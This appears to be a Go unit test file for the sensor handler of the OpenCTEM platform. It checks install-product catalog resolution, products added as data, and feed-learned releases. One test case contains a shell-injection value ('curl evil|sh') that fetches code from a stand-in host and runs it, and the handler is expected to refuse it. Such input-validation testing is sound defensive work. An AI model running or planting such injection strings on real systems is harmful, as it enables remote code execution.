package handler

import (
	"strings"
	"testing"

	"github.com/openctemio/openctem/api/internal/versions"
	"github.com/openctemio/openctem/api/pkg/domain/sensor"
	"github.com/openctemio/openctem/api/pkg/logger"
)

// Without any wiring the handler uses the catalog built into the API, and the
// scanning sensor's snippets pin versions.yaml's latest release: no image
// constant anywhere in Go.
func TestSensorHandler_DefaultCatalog(t *testing.T) {
	h := NewSensorHandler(nil, nil, logger.NewNop())
	p, ok := h.installProduct("", &sensor.Sensor{})
	if !ok || p.ID != versions.DefaultProductID || p.Image != versions.SensorImage()+":"+versions.SensorLatest() {
		t.Fatalf("default install product = %+v (%v)", p, ok)
	}
	if l, ok := h.currentPolicy().ReleaseLineFor(versions.DefaultProductID); !ok || l.Latest != versions.SensorLatest() {
		t.Fatalf("release line = %+v (%v)", l, ok)
	}
	if got := h.productResponses(); len(got) != len(versions.Products()) {
		t.Fatalf("products = %+v", got)
	}
}

func TestSensorHandler_InstallProduct(t *testing.T) {
	h := NewSensorHandler(nil, nil, logger.NewNop())
	h.SetProducts([]SensorInstallProduct{
		{ID: sensor.DefaultProduct, Latest: "v0.5.0", Image: "ghcr.io/openctemio/sensor:v0.5.0", Install: "sensor"},
		{ID: "openctemio-connector-tenable", Latest: "v0.1.0", Image: "ghcr.io/openctemio/connector-tenable:v0.1.0", Install: "connector-tenable"},
	})
	reports := func(product string) *sensor.Sensor { return &sensor.Sensor{Build: sensor.BuildInfo{Product: product}} }
	for _, c := range []struct {
		name, requested, reported, want string
		ok                              bool
	}{
		{"nothing requested, nothing reported: the scanning sensor", "", "", sensor.DefaultProduct, true},
		{"nothing requested: the product the sensor reports", "", "openctemio-connector-tenable", "openctemio-connector-tenable", true},
		{"a custom product: the scanning sensor's snippets", "", "acme-custom", sensor.DefaultProduct, true},
		{"requested wins over reported", "openctemio-sensor", "openctemio-connector-tenable", sensor.DefaultProduct, true},
		{"requested connector", "openctemio-connector-tenable", "", "openctemio-connector-tenable", true},
		{"unknown requested product is refused", "acme-custom", "", "", false},
		{"hostile value is refused", "x';curl evil|sh;'", "", "", false},
		{"upper case is refused", "OPENCTEMIO-SENSOR", "", "", false},
	} {
		t.Run(c.name, func(t *testing.T) {
			p, ok := h.installProduct(c.requested, reports(c.reported))
			if ok != c.ok || p.ID != c.want {
				t.Fatalf("installProduct(%q, reports %q) = %q, %v; want %q, %v", c.requested, c.reported, p.ID, ok, c.want, c.ok)
			}
		})
	}
	// The release lines follow the catalog.
	if l, ok := h.currentPolicy().ReleaseLineFor("openctemio-connector-tenable"); !ok || l.Latest != "v0.1.0" {
		t.Fatalf("connector line = %+v (%v)", l, ok)
	}
	// SetHealthPolicy keeps the catalog's lines.
	h.SetHealthPolicy(sensor.HealthPolicy{SDKLatestVersion: "v1.0.0"})
	if _, ok := h.currentPolicy().ReleaseLineFor("openctemio-connector-tenable"); !ok {
		t.Fatal("SetHealthPolicy dropped the catalog's release lines")
	}
}

// A sensor product the platform has never heard of, added as data
// (SENSOR_PRODUCTS_FILE): the Sensors page lists it (the console names it by
// its id), its install dialog can be asked for it, and its sensors are judged
// against its own release line. No Go code names it.
func TestSensorHandler_ProductAddedAsData(t *testing.T) {
	t.Cleanup(func() { _ = versions.LoadExtraProducts("") })
	if err := versions.LoadExtraProducts("../../../versions/testdata/toy-products.yaml"); err != nil {
		t.Fatal(err)
	}
	h := NewSensorHandler(nil, nil, logger.NewNop())
	h.SetProducts(CatalogInstallProducts())
	var listed *SensorProductResponse
	for _, p := range h.productResponses() {
		if p.ID == "acme-toy-sensor" {
			listed = &p
		}
	}
	if listed == nil || listed.Image != "ghcr.io/acme/toy-sensor:v1.2.3" || listed.LatestVersion != "v1.2.3" || listed.MinVersion != "v1.0.0" {
		t.Fatalf("toy product in /sensors/stats products: %+v", listed)
	}
	if p, ok := h.installProduct("acme-toy-sensor", &sensor.Sensor{}); !ok || p.Install != "acme-toy" {
		t.Fatalf("install product = %+v (%v)", p, ok)
	}
	reporting := &sensor.Sensor{Build: sensor.BuildInfo{Product: "acme-toy-sensor"}}
	if p, ok := h.installProduct("", reporting); !ok || p.ID != "acme-toy-sensor" {
		t.Fatalf("a toy sensor gets its own snippets: %+v (%v)", p, ok)
	}
	if l, ok := h.currentPolicy().ReleaseLineFor("acme-toy-sensor"); !ok || l.Latest != "v1.2.3" || l.Min != "v1.0.0" {
		t.Fatalf("toy release line = %+v (%v)", l, ok)
	}
}

// A release learned from the release feed reaches the install snippets, the
// release lines and the console list on the next request, without
// re-wiring the handler: no API release, no restart.
func TestSensorHandler_LearnedReleaseAppliesPerRequest(t *testing.T) {
	t.Cleanup(func() { versions.SetLearned(nil) })
	h := NewSensorHandler(nil, nil, logger.NewNop())
	h.SetSDKLatestSource(versions.SDKLatest)
	digest := "sha256:" + strings.Repeat("cd", 32)

	versions.SetLearned(map[string]versions.Learned{"sensor": {Version: "v99.1.0", Digest: digest}, versions.SDKKey: {Version: "v99.2.0"}})
	p, ok := h.installProduct("", &sensor.Sensor{})
	if !ok || p.Latest != "v99.1.0" || p.Image != versions.SensorImage()+":v99.1.0@"+digest || p.LatestSource != versions.SourceFeed {
		t.Fatalf("install product = %+v (%v)", p, ok)
	}
	pol := h.currentPolicy()
	if l, _ := pol.ReleaseLineFor(versions.DefaultProductID); l.Latest != "v99.1.0" || pol.SDKLatestVersion != "v99.2.0" {
		t.Fatalf("policy = %+v", pol)
	}
	var listed SensorProductResponse
	for _, r := range h.productResponses() {
		if r.ID == versions.DefaultProductID {
			listed = r
		}
	}
	if listed.LatestVersion != "v99.1.0" || listed.LatestSource != "feed" {
		t.Fatalf("listed = %+v", listed)
	}

	// Forgetting the feed falls back to the built-in release, marked as such.
	versions.SetLearned(nil)
	if p, _ := h.installProduct("", &sensor.Sensor{}); p.Latest == "v99.1.0" || p.LatestSource != versions.SourceBuiltIn || strings.Contains(p.Image, "@") {
		t.Fatalf("after forgetting: %+v", p)
	}
}
